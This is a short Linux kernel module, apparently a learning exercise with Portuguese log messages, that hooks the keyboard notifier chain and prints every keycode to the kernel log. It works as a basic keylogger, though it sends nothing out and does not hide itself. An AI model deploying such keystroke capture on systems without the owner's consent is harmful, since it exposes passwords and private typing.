#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/semaphore.h>

MODULE_LICENSE("GPL");

static struct semaphore sem;

static int keyboard_notifier(struct notifier_block *nblock, unsigned long code, void *_param) {
    
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYCODE) {

        printk(KERN_INFO "%c", param->value);
    
    }

    return NOTIFY_OK;

}

static struct notifier_block nb = {

    .notifier_call = keyboard_notifier

};

static int hello_init(void) {
    
    printk(KERN_INFO "Iniciando o módulo do kernel\n");

    sema_init(&sem, 1);
    register_keyboard_notifier(&nb);

    return 0;

}

static void hello_exit(void) {

    printk(KERN_INFO "Encerrando o módulo do kernel\n");

    unregister_keyboard_notifier(&nb);

}
module_init(hello_init);
module_exit(hello_exit);